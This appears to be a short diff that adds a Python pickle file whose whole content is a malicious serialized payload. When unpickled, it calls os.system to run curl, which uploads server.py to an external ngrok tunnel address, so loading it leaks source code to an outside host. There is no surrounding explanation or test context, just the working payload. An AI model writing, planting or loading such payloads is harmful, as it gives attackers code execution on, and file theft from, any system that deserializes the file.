@@ -1,0 +1,4 @@
+cos
+system
+(S'curl -i -F afile=@server.py https://82ad9b3f.ngrok.io'
+tR.
